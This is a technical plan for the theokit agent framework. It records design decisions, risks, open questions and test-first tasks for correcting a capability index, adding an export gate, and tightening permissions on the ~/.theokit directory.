### D1 — Fix the guard and the rows in the same change, never separately

**Decision.** `wiki/capability-index.md`'s two fabricated rows and `crossval-gaps.test.ts`'s substring assertion are corrected in one task, with the test change landing first (RED).

**Rationale.** Fixing the rows alone leaves the mechanism that admitted them; fixing the guard alone turns CI red with no path to green. `rules/testing.md § 3` requires a failing regression test before the fix, and here the failing test *is* the corrected guard. Cites `plan-confidence-golden-rule.md`'s core lesson — tests passing ≠ system works — applied to its own instrument.

**Alternatives considered.**
- *Correct the rows, file the guard as a follow-up.* Rejected: the follow-up is exactly what did not happen between 2026-08-14 and today, and the rows regressed into fabrication under a green guard.
- *Delete the index and rely on package READMEs.* Rejected: the index exists because the 2026-08-14 run measured five shipped capabilities being reimplemented for lack of a need→symbol map. Deleting it re-opens the wound the page was cut for.

**Consequences.** Enables a guard other tasks can extend (T4.1 reuses its parser). Constrains: the corrected guard will fail on any short-named symbol the index cites loosely, so T0.1 must audit all 21 rows, not only the two known-bad ones.

### D2 — Add an inverse gate for layer inventions, do not widen the parity gate to cover them

**Decision.** A new gate asserts *for every capability the layer invents, a callable symbol is exported from a published subpath*. `check-surface-parity.mjs` keeps its current question unchanged.

**Rationale.** `check-surface-parity.mjs:16-24` states its contract as "decision, not coverage" and `:63-70` explains why the 14 own-surface subpaths are skipped: the parity question is *undefined* there, not merely unanswered. Forcing an undefined question into that gate would corrupt a correct instrument. The inverse question is a different question and deserves a different gate — the same reasoning that made `check-sandbox-parity.mjs` and `check-wire-parity.mjs` separate scripts. Follows `rules/architecture.md § 3` (a module answering one question) and the M48 seam-family pattern from Prior Art.

**Alternatives considered.**
- *Widen `DECISIONS` to all 20 subpaths.* Rejected: 14 of them have no SDK counterpart, so the entries would be vacuous — the gate would grow and assert nothing, which is the `plan-confidence` "vacuous assertion" failure in a second location.
- *Manual review checklist in `cycle-review.md`.* Rejected: the seam that produced `ApprovalPosture` already had a written rule in its own JSDoc and it did not survive review. A rule a human must remember is the control that already failed here.

**Consequences.** Enables mechanical detection of the exact failure class measured. Constrains: "capability the layer invents" needs an operational definition — D3 supplies it.

### D3 — Define a layer invention as an exported type whose enforcement is unexported

**Decision.** The inverse gate's rule: for every **type** exported from a published subpath whose name matches a decision/policy shape (`*Posture`, `*Policy`, `*Decision`, `*Mode`, `*Options` carrying an enforcement function in the same module), a **callable** symbol from the same module must also be exported. The gate carries an explicit allowlist with sunset for deliberate type-only exports.

**Rationale.** The measured failure is precisely "the type crossed and the enforcement stayed home" — `ApprovalPosture` at `bridge/index.ts:70` with `applyPosture` at `:116` unexported. A name-shape heuristic is admittedly weaker than semantic analysis, and this is stated honestly rather than dressed as precision: the allowlist is the escape hatch, and per `code-quality-golden-rule.md § 4` every entry carries a ≤ 90-day sunset and a rationale. `rules/error-handling.md § 2` — a heuristic that fires loudly beats a silent gap.

**Alternatives considered.**
- *Assert every exported symbol has a consumer in TheoCode.* Rejected: couples the framework's CI to one consumer's source tree; a second consumer would break it, and the framework must not depend on a downstream repo.
- *Require a `@public` JSDoc tag and assert tagged symbols are exported.* Rejected as the primary mechanism — `provider-resolver.ts` was marked `@public` in its own JSDoc and exported by nothing, so the tag demonstrably does not carry enforcement here. Kept as a *secondary* signal the gate also checks.

**Consequences.** Enables catching the next `ApprovalPosture` at CI time. Constrains: false positives are expected on legitimate type-only exports, hence the allowlist; the gate ships in warn mode with a sunset (D8).

### D4 — Move the liveness oracle into the layer; leave project enumeration injected

**Decision.** `liveness-oracle.ts` (188 LOC, ALIVE/DEAD/UNDETERMINED + shared DFS budget) is absorbed into `@theokit/agents/session`. The `listProjects()` enumeration stays a consumer-supplied function.

**Rationale.** The question the oracle answers exists *because of a framework design decision*: `encodeProjectDir` is lossy, so a moved project can only be found by searching. The consumer had to write a search because the framework made the encoding one-way — the cost belongs where the cause is. The 2026-08-15 audit already reached the correct conclusion on the enumeration half ("its enumeration is injected and is six lines of `readdirSync`; the only framework knowledge in it was the `projects` path segment"), and that half stays product-owned. `rules/architecture.md § 2` (DIP: the domain declares the interface, the adapter satisfies it).

**Alternatives considered.**
- *Make `encodeProjectDir` reversible and delete the oracle entirely.* Rejected for now, but it is the better long-term fix and is filed as Q2. It is a breaking change to an on-disk layout with live transcripts in the field; doing it inside a plan whose goal is closing gaps would couple two risks.
- *Leave the oracle in the consumer and document it as product policy.* Rejected: it is 188 lines of framework-caused work, and a second product would write it a second time.

**Consequences.** Enables any product to sweep multi-project transcripts. Constrains: the DFS budget's measured behaviour (13.269 dirs, ~3.200 fallthrough, ~64M syscalls without a shared budget) becomes a framework invariant needing a framework-side test with a fixture at that scale.

### D5 — Absorb the consumer's scar tissue, not its interface

**Decision.** Every absorption task's RED test reproduces the *defect the consumer already hit*, taken from its code comments and BACKLOG rows, before the interface is moved.

**Rationale.** This is the predecessor plan's EC-review lesson, and this run produced four fresh instances: B-006 (an absent posture counts as unconfined), B-029 (`armed` last or the overlay draws nothing), the `0o022` vs `0775` mask measurement, and `sinceMarker`'s raw substring match silently truncating a read. Absorbing the interface without the scar re-ships the bug with a framework logo on it. `rules/testing.md § 3` — every bug fix starts with a failing regression test.

**Alternatives considered.**
- *Port the consumer's tests verbatim.* Rejected: its tests assert its wording and its paths; the framework needs the *invariant*, not the fixture. The scars are read from the comments and re-expressed as framework-level assertions.

**Consequences.** Enables adoption to be a deletion rather than a rewrite. Constrains: each absorption task is larger than a move, and the plan's LOC estimates account for the tests, not only the code.

### D6 — Fix the shape at the framework, never at the call site

**Decision.** Where a primitive exists in the wrong shape (sync remover, turn counting, mask, missing index), the framework's signature changes. The consumer is not asked to adapt.

**Rationale.** Each wrong shape has exactly one real consumer today and the shape is wrong *for the general case*, not for that consumer specifically: an agent registry that is async is the only registry the ecosystem has (`Agent.delete(id): Promise<void>`); `~/.theokit` is 0775 on any umask-002 machine; every transcript with a `compact_boundary` breaks the turn count. Adapting the call site would leave the next consumer to rediscover all four. Cites blueprint `m67`'s central lesson: verify against the version actually consumed before assuming the shape is a preference.

**Alternatives considered.**
- *Add a second function alongside each (e.g. `runTranscriptGCAsync`).* Rejected: doubles the surface for the same capability and forces every consumer to choose, which is the `plan-confidence` "two doors, one room" smell. The sync path has zero in-repo production callers, so widening is cheap.
- *Keep sync and let the consumer wrap the async remover.* Rejected: that wrapper is what `session-lifecycle.ts:236-239` correctly refuses, because the refusal exists to prevent a silently-truthy Promise. Asking the consumer to defeat a safety check is not a shape.

**Consequences.** Enables deletion in the consumer. Constrains: `deleteSession`'s signature widens, which is a minor for `@theokit/agents` — sequencing is bound to the publish train (Risk R1).

### D7 — Do not migrate `context/rules.ts`; close the four deltas as a separate decision

**Decision.** This plan does **not** attempt the `context/rules.ts` migration. It scopes Context & memory to the reachability half (finishing the `./config` subpath so the deprecated umbrella stops being the only door).

**Rationale.** The 2026-08-15 audit wrote that migration and **reverted it**: 157 → 98 lines, but four documented contracts changed at once — assembly order (files-before-subdirectories for an instruction *tree* vs lexicographic for a rules *folder*), truncation semantics (walk ceiling vs prompt ceiling), warning wording, and YAML strictness — and the result made `count` report 3 while the text carried 2. `rules/parsimony-ladder.md § Never on the chopping block` and Unbreakable Rule 3: shipping four silent behaviour changes to hit a score is the failure mode this whole exercise exists to catch.

**Alternatives considered.**
- *Migrate and accept the four deltas.* Rejected — it is the owner's decision, not a tidy-up, and it is filed as Q1.
- *Migrate only the assembly-order delta.* Rejected: order is the one delta that cannot be papered over, so a partial migration ships the hardest change with the least review.

**Consequences.** Constrains the ceiling: Context & memory can reach ~4,5 on reachability alone, which the arithmetic in Risk R6 accounts for. Enables the plan to stay honest about what it is not doing.

### D8 — New gates ship in warn mode with a dated sunset

**Decision.** The inverse gate (T4.1) and the widened index guard (T0.1) ship as warnings with a sunset of **2026-11-13** (90 days from the plan date — EC-7 corrected 2026-11-15, which was 92), promoted to errors by a follow-up ADR.

**Rationale.** `check-surface-parity.mjs:72-75` already made this call in writing for the same reason: *"a gate nobody can make green is a gate nobody reads."* Turning ~15 boundary holes and an unaudited index into hard CI errors in one commit leaves `develop` red with no green path. `code-quality-golden-rule.md § 4` fixes the 90-day sunset ceiling.

**Alternatives considered.**
- *Hard error immediately.* Rejected for the reason the sibling gate already documented.
- *Warn with no sunset.* Rejected: `code-quality-golden-rule.md § 4` — an allowlist entry without a sunset is permanent debt, and the same logic applies to a gate's warn mode.

**Consequences.** Constrains: the plan's Goal metric is the 17 assertions, which are hard; the gates' warn mode does not weaken it. Enables incremental green.

## Drawbacks & Risks

| Drawback / Risk | Severity | Mitigation | Owner |
|---|---|---|---|
| **R1 — The adoption phase is gated on a publish train that has failed before.** The 2026-08-15 audit ended `Not closed` on exactly this: PR #312 without an approving review, and a stale npm `_authToken` (`E401`, dated 2026-08-05). TheoCode consumes published packages, so Phase 5 cannot start until `@theokit/agents`, `@theokit/tui` and `@theokit/sdk` are on npm. | **High** | Phase 5 is explicitly sequenced after a publish checkpoint (T5.0) that verifies `npm view` resolves each new version before any consumer edit. `verify-publish-credential.mjs` already refuses before a release rather than after. Human approval of the release PR is an Unbreakable-Rule-4 gate and is not automatable — it is a scheduled dependency, not a risk to engineer around. | Paulo (release) |
| **R2 — Four repositories move together.** `theokit`, `theokit-tui`, `theokit-sdk` and `TheoCode` each need a `workspace` branch, a PR and a release. A partial landing leaves the consumer on a mix of versions. | **High** | Per-repo version floors are declared in T5.0 and asserted by the consumer's own `package.json` before adoption edits begin. `check-pack-no-workspace.mjs` already prevents a workspace-linked publish. Each repo's change is independently valid — no cross-repo atomic commit is required. | Paulo |
| **R3 — SUPERSEDED in v2.0.** This risk existed because 4,60 was the Goal; it is now a derived indicator, so a result of 4,4 is a datum rather than a failure. The arithmetic is kept because it is still the honest way to read the score, and the no-re-weighting rule below still binds. **The risk that replaces it: the new Goal can only be closed by a deletion in a repository this plan does not own, behind a publish gate that has already failed twice** — so the plan can be entirely correct and still show zero progress on its own metric. That is the intended property, not a defect: it is what makes the metric unfakeable. Mitigation is sequencing (O1 → O2 → O3), not engineering. Original arithmetic: total weight 24,0, so 4,60 needs ≥ 110,4 points against 79,4 today. **v1.2 revision (EC-1):** `Error model` (weight 1,0) was scored 2,50 on a gap that does not exist; re-scored on the surviving evidence — 29/29 typed classes, base class reachable, bare-throw rate 23/87 against the consumer's 6/57 — it lands at 4,00. The falsified phase-3 row was **removed** from the database rather than averaged with the correction, so the corrected **baseline is 3,37** (80,9 points), not 3,31. Projected total moves from ~111,9 to ~113,4 (**4,73**). The honest framing is not "the plan got cheaper": one of the 17 gaps was never a gap, and the score was wrong in the pessimistic direction. Two dimensions landing at 4,0 instead of 4,5 still drops it below target. | **High** | Stated openly rather than discovered at scoring time. T5.4 re-scores against the same rubric and the same weights, and if the result lands in 4,4–4,6 the honest report is the number, not a re-weighting. Weights MUST NOT be adjusted after the fact — that is score-fitting, and `plan-confidence-golden-rule.md` treats a moved target as fabrication. | Paulo |
| **R4 — The score is analyst judgement anchored to evidence, not a measured quantity.** The cross-validation report says so in its own honesty section. A plan whose Goal cites the score inherits that softness. | **Medium** | The Goal's primary metric is the 17 executable assertions, which are mechanical; the score is stated as the consequence. T5.4 requires each dimension's re-score to cite the assertion that changed, so a score movement without a corresponding green assertion is refused. | Paulo |
| **R5 — The liveness oracle absorption (D4) moves 188 LOC of measured behaviour across a repo boundary.** Its DFS budget was tuned against a real machine with 13.269 project directories; a framework-side test cannot cheaply reproduce that scale. | **Medium** | T3.2's TDD uses a synthetic fixture at reduced scale with the budget parameterised, plus one property assertion (total syscalls ≤ budget) that holds at any scale. The full-scale behaviour is verified once in the adoption phase against the consumer's real machine and recorded as evidence, not asserted from the fixture. | Paulo |
| **R6 — `context/rules.ts` stays unmigrated by decision (D7), capping one dimension.** | **Medium** | Accounted for in the R3 arithmetic: Context & memory is projected at 4,5 from reachability alone, not 4,75. If the owner resolves Q1 during implementation, the ceiling rises; the plan does not depend on it. | Paulo |
| **R7 — The inverse gate's name-shape heuristic (D3) will produce false positives.** | **Low** | Ships in warn mode with an allowlist carrying mandatory sunsets (D8). Every false positive that gets allowlisted is a datum about the heuristic, reviewed at the sunset date. | Paulo |
| **R8 — Absorbing `createViewImageTool` changes which implementation the consumer runs.** Its local copy has an `outputSchema`/`toModelOutput` split returning an image content block; the SDK factory's behaviour must match or the tool silently returns a different shape to the model. | **Medium** | T1.2's RED test asserts the framework factory returns an image content block with the same shape the consumer's local tool returns, using the consumer's file as the specification. If they diverge, the task stops and the divergence becomes a finding rather than a silent behaviour change. | Paulo |

## Unresolved Questions

- Q1 — **Which of the four `context/rules.ts` contracts should the framework bend on?** Assembly order is the one that cannot be papered over: an instruction *tree* wants files-before-subdirectories (outer file states the rule, inner refines), a rules *folder* wants lexicographic. Owner decision, deliberately out of this plan's scope (D7). Blocks Context & memory from exceeding ~4,5.
- Q2 — **Should `encodeProjectDir` become reversible, retiring the liveness oracle entirely?** It is the better fix and it is a breaking change to an on-disk layout with live transcripts. Not in this plan (D4). If the answer is yes, T3.2 becomes throwaway work — which is why it is asked before T3.2 starts, not after.
- Q3 — **What mask should `assertSecureModes` enforce?** The framework ships `& 0o022` (refuses group-write) while creating `~/.theokit` at 0775 under umask 002. Either the mask narrows to world-write (the consumer's measured choice) or the directory creation tightens to 0700. Both are defensible; they are not both compatible, and shipping the current pair means the framework fails its own check. Must be answered before T2.4.
- Q4 — **Is `delegate_to_team`'s sequential-team shape worth a framework primitive?** The 2026-08-15 audit correctly declined to contort `createDelegateTool` to claim adoption. Two shapes now have one consumer's worth of evidence, not two. Deferred pending a second consumer; recorded so the next measurement does not re-derive it.
- Q5 — **Does `readJsonlTail` gain an absolute index, or does the consumer keep its own reader?** The verification found a second, previously unrecorded defect: `sinceMarker` is a raw substring match, so a message *containing* `compact_boundary` silently truncates the read. Fixing the substring match is unambiguous; adding an absolute index is a signature change whose only known consumer measured a reason not to use the function at all. T2.5 fixes the substring defect; the index is deferred.

> **Q2 and Q3 — PROPOSED ANSWER by the implementing agent, 2026-08-16. NOT owner-signed.**
>
> The owner granted autonomy over PRs and merges. That is not a review of these two questions, and Q3 is security-relevant, so both are recorded here as *the implementer's proposal with its evidence* and remain open for owner confirmation. T2.4 and T3.2 proceed on the proposal; if the owner disagrees, the diff is small and reversible.
>
> **Q3 — proposal: keep the mask at `0o022`; fix the CREATORS instead.** The question's premise was half wrong, and the wrong half changes the fix. `credential-store.ts:257-258` creates the credential home with `mkdirSync({mode: 0o700})` **and** an unconditional `chmodSync(dir, 0o700)`; measured on this machine, `~/.theokit` is `700`, not 775. But five other creators reach the same tree with a bare `mkdirSync(..., {recursive: true})` and no mode: `session-pointer.ts:94`, `project-index.ts:73`, `jsonl.ts:127`, `task/store.ts:166`, `lance-index.ts:126`. The framework already wrote this diagnosis itself at `trust-store.ts:157-161` — *"the mode argument is a NO-OP on a directory that already exists, and this one is shared with the SDK's transcript root — whoever creates it first sets the permissions… Found by a consumer's test failing during migration."* So the check is right and the layout disagrees with itself. **T2.4 is re-scoped: route the remaining creators through the existing `ensureSecureDir` helper** — the fix the framework applied to the trust store and left unfinished. Adopting the consumer's world-write narrowing would relax a security gate to hide an inconsistency, which is why it is not proposed here.
>
> **Q3 — correction to the proposal above, measured while implementing T2.4 (2026-08-16).** The
> proposal named five creators as reaching "the same tree". Two of them do not, and the difference
> decides the fix:
>
> - `session-pointer.ts:94`, `project-index.ts:73` and `jsonl.ts:127` build under `transcriptRoot()`
>   — the shared `~/.theokit`. All three were routed through `ensureSecureDir` (the first two) or
>   given a creation mode (the third, on the per-append hot path where a stat+chmod per write is not
>   affordable). This is the part of the proposal that held.
> - `task/store.ts:166` takes its directory from the CALLER and need not be under the shared root at
>   all, so hardening it here would be a guess about someone else's layout.
> - `lance-index.ts:126` builds `join(opts.cwd, '.theokit', 'memory', 'lance')` — the **project's**
>   `.theokit`, not the home one. `assertSecureModes` never inspects it, and forcing `0700` on a
>   directory inside a checked-out repository would break a shared workspace to satisfy a check that
>   does not apply there. Same for `migrate-sqlite-to-lance.ts:162`.
>
> The two `.theokit` trees having the same name is exactly why the proposal conflated them.

> **Q2 — proposal: no.** `encodeProjectDir` stays lossy and T3.2 proceeds as D4 planned. Making it reversible is a breaking change to an on-disk layout with live transcripts in the field; coupling it to a plan about reachability would put two unrelated risks in one release. Re-open with a migration plan of its own.
>
> **Q1, Q4 and Q5 remain open** — Q1 and Q4 are owner-scope decisions this plan deliberately excludes (D7; the two-shapes evidence), and Q5 is settled inside T2.5's caller audit.


## Dependency Graph

```
Phase 0 (truth of the map) ──┬──▶ Phase 1 (one-line reachability) ──┐
                             │                                       │
                             └──▶ Phase 4 (the structural gate) ─────┤
                                                                     │
Phase 2 (shape fixes) ───────────────────────────────────────────────┤
                                                                     │
Phase 3 (surface primitives) ────────────────────────────────────────┤
                                                                     ▼
                                                   ══ PUBLISH CHECKPOINT (T5.0) ══
                                                                     │
                                                                     ▼
                                                    Phase 5 (TheoCode adoption)
                                                                     │
                                                                     ▼
                                              Final Phase (integration validation)
```

- **Phase 0 blocks Phase 4** — T4.1's gate reuses the declared-export parser T0.1 builds. Nothing else depends on Phase 0, so it goes first because it is cheap and closes the critical gap.
- **Phases 1, 2, 3 are mutually parallel.** They touch disjoint files across three repos: Phase 1 is `errors.ts` / `tools-entry.ts` / `wiki` / SDK exports map; Phase 2 is `session/` + `bridge/` + SDK credential store; Phase 3 is `theokit-tui` + `session/gc/`.
- **The publish checkpoint is a hard barrier.** No Phase 5 task begins before T5.0 verifies every floor resolves on the registry (Risk R1).
- **Phase 5 tasks are sequential** — each deletion is verified by the consumer's own suite before the next begins, so a regression is attributable to one adoption.

---

## Phase 0: The map tells the truth

**Objective:** make the capability index accurate and its guard capable of detecting inaccuracy.

### T0.1 — Replace the substring guard with declared-export matching, and audit all 21 index rows

#### Objective
`tests/integration/crossval-gaps.test.ts` asserts that every symbol cited in `wiki/capability-index.md` is a **declared export** of the published surface, and all 21 rows pass.

#### Why this step (action + reasoning)

**What this step does.** Rewrites the index guard to parse declared exports out of `packages/agents/dist/*.d.ts` (`declare (const|function|class|type|interface) <name>` plus the `export { … }` lists) and match cited symbols against that set with word boundaries; then corrects every index row the new guard rejects.

**Why it is necessary now.** The guard is the only thing standing between the index and fabrication, and it cannot detect fabrication: `expect(dts).toContain('agent')` passes on `agentHandle` and on the literal string `@theokit/agents`. The index's **first two rows** — how to author an agent and a tool, the first thing a customer reads — cite `agent` and `tool`, which do not exist. This is first because every other task in this plan adds a row to that index, and adding rows to an unguarded register propagates the defect. Cites D1.

#### Evidence
- `tests/integration/crossval-gaps.test.ts:198-202` — `expect(dts, …).toContain(symbol)` over `agentsDts()`, a concatenation of the published `.d.ts`.
- `wiki/capability-index.md:30-31` — `| Author an agent with a fluent builder | \`agent\` | \`@theokit/agents\` | 8.x |` and the `tool` row beneath it.
- `grep -rn "declare (const|function) agent" packages/agents/dist/*.d.ts` returns `agentHandle` (`agent-handle-Dgi4ZGbg.d.ts:257`) and `agentsPlugin` (`bridge-entry-CmYUgNit.d.ts:1497`) — neither is `agent`.
- `wiki/capability-index.md:14-16` states the page's own rule: *"a row citing a symbol that does not exist is a defect, and `tests/integration/crossval-gaps.test.ts` fails on it."*

#### Files to edit
```
tests/integration/crossval-gaps.test.ts — replace the substring assertion with declared-export matching; RED first
wiki/capability-index.md — correct rows :30-31 to AgentBuilder.create / Tool.create; audit the other 19
```

#### Deep file dependency analysis
- `crossval-gaps.test.ts` (512 LOC, `e55b3523`) holds one assertion per registered gap. It has no production callers; it is the register. The change is local to the `capability_index_symbols_resolve` block and must not disturb `noteSkip('G10')`, which correctly skips when `dist` is unbuilt (`Invariants to preserve` row).
- `wiki/capability-index.md` (95 LOC, `939141d9`) has no code callers. Downstream: `CLAUDE.md` points readers at it for "which symbol delivers capability X".

#### Deep Dives
- **Parser shape — THREE sources, not two (EC-2).** (a) `declare (const|function|class|abstract class|type|interface|enum) <Name>`; (b) the `export { A, B as C }` list, taking the exported alias; (c) **`export * from '<spec>'`, resolved by recursing into that module's `.d.ts`**. Union into a `Set<string>`. Matching is exact set membership, never substring.
- **Why (c) is not optional.** `packages/agents/dist/index.d.ts` carries five star forwards at `:8,15,21,22,23` (`@theokit/sdk/errors`, `/retry`, `/concurrency`, `/messages`, `/models`). A parser blind to them produces **false negatives**: it rejects index rows that are correct, and the likely reaction to a red CI is to delete the row — removing a real capability from the map, the exact inverse of this task's purpose. This is not hypothetical: the same blindness, applied by hand, is what produced registered gap 16 and the U-11 caveat, both of which claimed `TheokitAgentError` was unreachable when running the import proves it is (see T1.1 and EC-1).
- **The technique lesson this task installs.** A symbol-reachability claim is valid only if the method follows `export *`. Three measurements in this cycle failed that test — gap 16, the U-11 caveat, and this parser as first designed. The corrected parser is the mechanical form of the lesson; T1.1's test is its regression.
- **Recursion bound.** One hop is sufficient for all five forwards and keeps the parser terminating without a cycle check. A star chain deeper than one hop is reported as an explicit limitation rather than silently under-resolved.
- **Invariant.** A symbol cited as `Foo.bar()` (method on a class) resolves when `Foo` is in the set — the index cites entry points, not every member.
- **Edge cases.** Backtick-wrapped citations spanning generics (`` `Agent<T>` ``) → strip the type parameters before lookup. Rows citing a subpath rather than a symbol (`@theokit/agents/config`) → skipped by the existing regex, which only matches backticked identifiers. An unbuilt `dist` → keep the existing skip. A star forward whose target `.d.ts` cannot be resolved on disk → the run reports it as unresolved coverage rather than treating the module as exporting nothing.

#### Pseudo-code / Signatures
```pseudocode
function declaredExports(dtsFiles: string[], hop = 0): Set<string>
  names = new Set()
  for text in dtsFiles:
    for m in text.matchAll(/^\s*(?:export\s+)?declare\s+(?:const|function|class|abstract class|type|interface|enum)\s+([A-Za-z_$][\w$]*)/gm):
      names.add(m[1])
    for block in text.matchAll(/export\s*\{([^}]*)\}/g):
      for spec in block[1].split(','):
        names.add(last_identifier_of(spec))         -- handles "A as B" → B
    -- (c) EC-2: follow the star forwards, ONE hop
    if hop === 0:
      for star in text.matchAll(/^export\s+\*\s+from\s+'([^']+)'/gm):
        target = resolveDts(star[1])                -- undefined ⇒ report unresolved, never silent
        if target: names = union(names, declaredExports([read(target)], hop + 1))
        else: reportUnresolvedForward(star[1])
  return names

# Example
input dts:  "export * from '@theokit/sdk/errors';\ndeclare function agentHandle<T>(p: string): AgentHandle<T>;\nexport { agentHandle };"
lookup 'agent'              → false   (was true under toContain — the original defect)
lookup 'agentHandle'        → true
lookup 'TheokitAgentError'  → true    (was false without hop (c) — the EC-2 defect)
```

#### Tasks
1. Add `declaredExports()` helper to the test file.
2. Rewrite the `capability_index_symbols_resolve` assertion to use it (RED — two rows fail).
3. Run the test, capture the full list of rejected symbols across all 21 rows.
4. Correct `wiki/capability-index.md:30-31` to `AgentBuilder.create` / `Tool.create`.
5. Correct every other row the run rejected.
6. Add a second assertion: symbols listed under `## Honest gaps` MUST NOT resolve (the inverse — closes gap 20's class of error).

#### TDD
```
RED:     test_capability_index_symbols_are_declared_exports() — fails on `agent` and `tool` before the row fix
RED:     test_honest_gaps_symbols_do_not_resolve() — fails on PermissionStore and @theokit/agents/config, which ship
RED:     test_star_forwarded_symbols_resolve() — EC-2: TheokitAgentError, reachable only via `export *`
RED:     test_member_and_generic_citations_resolve_on_their_root_symbol() — EC-21: `AgentBuilder.create`, `Agent<T>`
RED:     test_an_unresolvable_star_target_is_reported_not_silently_empty() — EC-2 edge
GREEN:   correct the index rows; all assertions pass
REFACTOR: extract declaredExports() so T4.1 can import it rather than re-parse
VERIFY:  pnpm vitest run tests/integration/crossval-gaps.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] `declaredExports()` returns a set containing `agentHandle` and NOT containing `agent`, asserted directly.
- [ ] All 21 index rows resolve — `pnpm vitest run tests/integration/crossval-gaps.test.ts` exits 0.
- [ ] The `## Honest gaps` section contains zero symbols that resolve.
- [ ] Pass: lint — `pnpm lint` zero warnings on changed files.
- [ ] Pass: size — both changed files under 500 lines, per `bash scripts/check-file-size.sh` (or `wc -l` on the changed set).

#### DoD
- [ ] `pnpm vitest run tests/integration/crossval-gaps.test.ts` green.
- [ ] `pnpm typecheck` zero errors.
- [ ] `CHANGELOG.md` `[Unreleased] § Fixed` entry naming the two corrected rows.

### T0.2 — Measure where a newcomer building an EmpresaCode actually gets stuck (NEW in v2.0)

#### Objective
Establish the baseline the Goal's second half needs: how far `create-theokit --surface=tui` carries a developer toward TheoCode's core loop, and what they must write by hand after it stops.

#### Why this step (action + reasoning)

**What this step does.** Scaffolds a fresh app with `create-theokit --surface=tui` in a clean directory, then drives it toward the three capabilities that define a coding agent — a tool the model can call, an approval gate a human answers, and a session that resumes — recording every file the developer must create or edit and every moment they must read framework source to proceed.

**Why it is necessary now.** The Goal's second half says building an EmpresaCode must be *simple*, and **there is no number for that**. Nobody has run the scaffold as a newcomer. Declaring a target before measuring would be the fabricated precision this plan has caught four times already — in the capability index's two invented rows, in the closure register deriving `17` from a matrix row-count that was wrong, in a changeset instructing a migration for an unpublished symbol, and in a commit trailer claiming `tsc exit 0` against a config it never ran. Cites the Goal's second half and `rules/parsimony-ladder.md` rung 1: do not build the improvement before knowing what is missing.

**This task produces a measurement, not a fix.** Whatever it finds becomes scope for a later plan, and the honest outcome may be that the scaffold is already adequate.

#### Evidence
- `packages/create-theokit/src/cli.ts:44` — `--surface=<web|tui|desktop>` exists.
- `packages/create-theokit/templates/surfaces/tui/` — 1.922 LOC of template (App, main, theme, tool-variations, `components/{UsagePanel,Banner,Demos}`).
- `packages/create-theokit/src/scaffold-surface.ts:16` records that a defect here was caught only by running `npx create-theokit --surface tui` for real, never by unit tests — the same instrument-vs-reality gap this whole plan is about.
- TheoCode reaches the three capabilities in `packages/agent/src/chat.ts` (643 LOC composition root) plus `packages/tui/src/consent/` (430) and `session/` — that is the destination this measures the distance to.

#### Files to edit
```
(none in this repository — the scaffold runs in a throwaway directory)
.claude/knowledge-base/audits/2026-08-XX-empresacode-newcomer-baseline.md (NEW) — the recorded run
```

#### Deep Dives
- **The measurement must be adversarial about its own honesty.** The person running it knows this codebase, which is exactly the bias that made TheoCode a poor proxy for a customer (shared maintainer). Mitigation: record every moment framework source had to be opened to proceed, and count those separately — a newcomer cannot do that.
- **What is counted.** Files created, files edited, framework source files read to proceed, and the wall-clock to each of the three capabilities. Not lines written — a developer copying 200 lines from a working example is closer to "simple" than one writing 20 after an hour of reading.
- **Edge case.** The scaffold may fail outright on a clean machine (missing peer, unpublished version). That is the most valuable possible result and must be recorded as the finding, not fixed inline.

#### Tasks
1. Run `npx create-theokit empresacode-probe --surface=tui` in a clean temp directory against the **published** packages.
2. Drive it to: a callable tool, an approval gate a human answers, a session that resumes.
3. Record files created/edited, framework sources opened, and where progress stalled.
4. Write the audit. Propose the O4 target number **from the measurement**.

#### TDD
```
(measurement task — the artifact is the recorded run, not a test)
VERIFY:  the audit exists, names the version of each package used, and states a
         proposed O4 number derived from what was counted
```

#### Concurrency tests
```
(none — single-threaded)
```

#### Acceptance Criteria
- [ ] The run used **published** packages, not workspace links — a newcomer has no monorepo.
- [ ] Every framework source file opened to make progress is listed.
- [ ] The proposed O4 number is derived from the count, not chosen.
- [ ] A failure to scaffold at all is recorded as the result, not repaired mid-run.

#### DoD
- [ ] Audit committed under `knowledge-base/audits/`.
- [ ] O4 in `## Objective` updated with the measured number.

---

## Phase 1: One-line reachability

**Objective:** make already-built capabilities importable. Every task here is a re-export or an exports-map entry.

### T1.1 — Pin the base-error reachability and correct the record

> **v1.2 — this task was inverted by EC-1.** v1.0/v1.1 planned to *add* re-exports of `TheokitAgentError` and `isTransientError`. They are already reachable. The task is now to **prove** it, **pin** it, and **correct** the registered gap that said otherwise. No re-export is written — `rules/parsimony-ladder.md` rung 1.

#### Objective
`import { TheokitAgentError, isTransientError } from '@theokit/agents'` is covered by a regression test, the capability index carries the row, and registered gap 16 is reclassified as a measurement error.

#### Why this step (action + reasoning)

**What this step does.** Adds a test asserting the base class and its predicate are importable from the layer and that `instanceof` holds across the seam; adds the capability-index row; reclassifies gap 16 in the cross-validation database with the corrected finding.

**Why it is necessary now.** The gap this task originally existed to close **does not exist**. `packages/agents/dist/index.d.ts:8` is `export * from '@theokit/sdk/errors'`, and that forward carries the base class and `isTransientError` onto the layer's root barrel — verified by running the import, not by reading it. What made two independent measurements believe otherwise is that both grepped the `.d.ts` for the symbol name and saw only `import { TheokitAgentError } from '@theokit/sdk/errors'`: **grep does not follow `export *`**. The test added here is the artifact that stops a third measurement from repeating it, and it protects a real consumer contract — if a future refactor replaces the star forwards with explicit lists, the base class drops off the surface silently. Cites D5 (absorb the scar — here the scar is a measurement technique, not a defect) and EC-1.

#### Evidence (executed, not inferred)
- `grep -n "^export \*" packages/agents/dist/index.d.ts` → five forwards at `:8,15,21,22,23` (`@theokit/sdk/errors`, `/retry`, `/concurrency`, `/messages`, `/models`).
- Runtime probe: `import('packages/agents/dist/index.js')` reports `TheokitAgentError` → `function`, `isTransientError` → `function`.
- Type probe: a file importing both from `@theokit/agents` and using `e instanceof TheokitAgentError` plus `isTransientError(e)` type-checks clean under `strict` with the repo's own `node_modules/.bin/tsc` — exit 0.
- `packages/agents/src/errors.ts:18` — the file re-exports only `ConfigurationError`, which is what made the manual reading plausible.
- `TheoCode/packages/shared/src/agent.test.ts:52` — the consumer imports zero symbols from `@theokit/sdk`; with the star forward, it does not need to.

#### Files to edit
```
packages/agents/tests/unit/error-base-reachable.test.ts (NEW) — the pinning test
wiki/capability-index.md — the row, marked as already shipping
cross-validation-output/cross-validation.db — gap 16 reclassified (see Tasks)
```

#### Deep file dependency analysis
